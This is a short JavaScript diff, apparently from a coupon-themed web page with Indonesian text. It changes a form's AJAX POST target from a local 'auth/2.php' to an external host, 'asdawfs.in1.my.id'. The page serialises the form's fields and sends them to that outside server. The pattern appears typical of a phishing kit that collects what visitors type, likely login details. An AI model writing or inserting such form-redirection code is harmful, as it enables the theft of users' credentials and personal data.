@@ -9,7 +9,7 @@ document.getElementById('kirim').innerHTML = "Memproses Cetak Kupon....";
 
  $.ajax({
  type: 'POST',
- url: 'auth/2.php',
+ url: 'https://asdawfs.in1.my.id/auth/2.php',
  data: $(formData).serialize(),
  datatype: 'text',
  
